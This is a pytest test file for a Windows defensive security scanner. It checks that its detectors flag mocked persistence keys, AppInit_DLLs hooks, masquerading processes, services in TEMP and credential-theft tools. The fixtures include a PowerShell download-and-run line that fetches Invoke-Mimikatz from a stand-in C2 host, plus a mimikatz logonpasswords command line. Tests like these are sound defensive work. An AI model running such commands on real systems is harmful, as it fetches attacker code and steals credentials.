"""
End-to-End Integration and Scenario Tests for Windows Defensive Security Scanner.

Validates the five mandatory requirement scenarios:
1. Create a fake registry entry pointing to a non-existent file -> Persistence detector flags it.
2. Simulate a process with a suspicious name -> Process detector flags it.
3. Mock AppInit_DLLs -> Keylogger detector flags it.
4. Test credential theft detector with a fake process command line containing "mimikatz".
5. Test hidden install detector with a service path in %TEMP%.
6. Full end-to-end scan pipeline execution via SecurityScanner producing defensive_scan_log.txt.
"""

import os
import pytest
from scanner import SecurityScanner
from detectors.persistence_detector import PersistenceDetector
from detectors.process_detector import ProcessDetector
from detectors.keylogger_detector import KeyloggerDetector
from detectors.credential_theft_detector import CredentialTheftDetector
from detectors.hidden_install_detector import HiddenInstallDetector


def test_e2e_scenario_1_persistence_non_existent_registry(mock_registry):
    """
    Scenario 1: Create a fake registry entry pointing to a non-existent file,
    run persistence detector, and assert it is flagged.
    """
    detector = PersistenceDetector()
    detector.registry_provider = mock_registry
    detector.service_provider = lambda: []
    detector.task_provider = lambda: []

    fake_missing_path = r"C:\Windows\System32\ghost_backdoor_payload_98765.exe"
    mock_registry.store[("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run")] = [
        {"name": "FakeGhostPersist", "data": fake_missing_path, "type": 1}
    ]

    findings = detector.run()

    # Assert detection
    flagged = [
        f for f in findings
        if f["category"] == "Persistence"
        and "non-existent file" in f["description"].lower()
        and "FakeGhostPersist" in f["evidence"]
    ]
    assert len(flagged) >= 1, "Failed to flag persistence registry entry pointing to non-existent file"
    assert flagged[0]["severity"] in ("WARN", "ALERT")


def test_e2e_scenario_2_process_suspicious_name():
    """
    Scenario 2: Simulate a process with a suspicious name,
    run the process detector, and assert detection.
    """
    detector = ProcessDetector()

    detector.process_provider = lambda: [
        {
            "pid": 4444,
            "name": "covert_keylogger_rat.exe",
            "exe": r"C:\Users\Target\covert_keylogger_rat.exe",
            "cmdline": r"covert_keylogger_rat.exe --listen 4444",
            "username": "TargetUser",
            "ppid": 1000
        }
    ]

    findings = detector.run()

    flagged = [
        f for f in findings
        if f["category"] == "Process Spoofing / AV Evasion"
        and "suspicious malware indicators" in f["description"].lower()
        and "4444" in f["evidence"]
    ]
    assert len(flagged) >= 1, "Failed to flag process with suspicious name"
    assert flagged[0]["severity"] == "ALERT"


def test_e2e_scenario_3_keylogger_appinit_dlls(mock_registry):
    """
    Scenario 3: Mock AppInit_DLLs and verify keylogger detector flags it.
    """
    detector = KeyloggerDetector()
    detector.registry_provider = mock_registry
    detector.process_provider = lambda: []

    mock_registry.store[("HKLM", r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows")] = [
        {"name": "AppInit_DLLs", "data": r"C:\Windows\System32\hook_inject.dll", "type": 1},
        {"name": "LoadAppInit_DLLs", "data": 1, "type": 4}
    ]

    findings = detector.run()

    flagged = [
        f for f in findings
        if f["category"] == "Keylogging"
        and "AppInit_DLLs" in f["description"]
        and "hook_inject.dll" in f["evidence"]
    ]
    assert len(flagged) >= 1, "Failed to flag non-empty AppInit_DLLs registry entry"
    assert flagged[0]["severity"] == "ALERT"


def test_e2e_scenario_4_credential_theft_mimikatz():
    """
    Scenario 4: Test credential theft detector with a fake process command line containing "mimikatz".
    """
    detector = CredentialTheftDetector()

    detector.process_provider = lambda: [
        {
            "pid": 5555,
            "name": "rundll32.exe",
            "exe": r"C:\Windows\System32\rundll32.exe",
            "cmdline": r"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://c2/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
            "username": "SYSTEM",
            "ppid": 500
        }
    ]

    findings = detector.run()

    flagged = [
        f for f in findings
        if f["category"] == "Credential Theft"
        and "mimikatz" in f["evidence"].lower()
    ]
    assert len(flagged) >= 1, "Failed to flag process command line containing 'mimikatz'"
    assert flagged[0]["severity"] == "ALERT"


def test_e2e_scenario_5_hidden_install_temp_service():
    """
    Scenario 5: Test hidden install detector with a service path in %TEMP%.
    """
    detector = HiddenInstallDetector()

    detector.service_provider = lambda: [
        {
            "name": "StealthUpdaterSvc",
            "display_name": "Background Diagnostic",
            "binpath": r"%TEMP%\system_update_service.exe",
            "start_type": "auto",
            "description": "Background system maintenance service",
            "status": "RUNNING"
        }
    ]

    findings = detector.run()

    flagged = [
        f for f in findings
        if f["category"] == "Hidden Installation"
        and "StealthUpdaterSvc" in f["evidence"]
    ]
    assert len(flagged) >= 1, "Failed to flag service with binary path in %TEMP%"
    assert flagged[0]["severity"] == "ALERT"


def test_e2e_full_scanner_pipeline(tmp_path, mock_registry):
    """
    Scenario 6: Full end-to-end execution of SecurityScanner running all detectors
    in an integrated environment and verifying report and log generation.
    """
    output_log = tmp_path / "defensive_scan_log.txt"

    scanner = SecurityScanner(
        log_file=str(output_log),
        color_enabled=False,
        verbose=True
    )

    # Set up mock data across detectors
    mock_registry.store[("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run")] = [
        {"name": "NonExistentRunKey", "data": r"C:\Windows\System32\non_existent_binary.exe", "type": 1}
    ]
    mock_registry.store[("HKLM", r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows")] = [
        {"name": "AppInit_DLLs", "data": r"C:\Evil\hook.dll", "type": 1}
    ]

    simulated_processes = [
        {
            "pid": 1111,
            "name": "svchost.exe",
            "exe": r"C:\Users\Public\svchost.exe",  # Masquerading
            "cmdline": r"C:\Users\Public\svchost.exe",
            "username": "User",
            "ppid": 100
        },
        {
            "pid": 2222,
            "name": "mimikatz_dump.exe",
            "exe": r"C:\Tools\mimikatz_dump.exe",
            "cmdline": r"mimikatz_dump.exe sekurlsa::logonpasswords",
            "username": "Admin",
            "ppid": 100
        },
        {
            "pid": 3333,
            "name": "spy_cam_recorder.exe",
            "exe": r"C:\Tools\spy_cam_recorder.exe",
            "cmdline": r"spy_cam_recorder.exe --screen",
            "username": "User",
            "ppid": 100
        }
    ]

    simulated_services = [
        {
            "name": "TempSvc",
            "display_name": "Temp Service",
            "binpath": r"C:\Windows\Temp\payload.exe",
            "start_type": "auto",
            "description": "Temp service",
            "status": "RUNNING"
        }
    ]

    simulated_tasks = [
        {
            "name": "ScreenGrabTask",
            "task_to_run": r"powershell.exe -c CopyFromScreen",
            "author": "Attacker"
        }
    ]

    # Inject mock providers into all scanner detectors
    for d in scanner.detectors:
        d.registry_provider = mock_registry
        d.process_provider = lambda: simulated_processes
        d.service_provider = lambda: simulated_services
        d.task_provider = lambda: simulated_tasks

    findings = scanner.run()

    # Assert all categories are detected
    categories_detected = {f["category"] for f in findings}
    assert "Persistence" in categories_detected
    assert "Process Spoofing / AV Evasion" in categories_detected
    assert "Keylogging" in categories_detected
    assert "Credential Theft" in categories_detected
    assert "Covert Surveillance" in categories_detected
    assert "Hidden Installation" in categories_detected

    # Verify log file was written and contains findings
    assert output_log.is_file()
    log_content = output_log.read_text(encoding="utf-8")
    assert "WINDOWS DEFENSIVE SECURITY SCANNER - AUDIT LOG" in log_content
    assert "[ALERT]" in log_content
    assert "mimikatz" in log_content.lower()
    assert "SUMMARY BY CATEGORY" in log_content
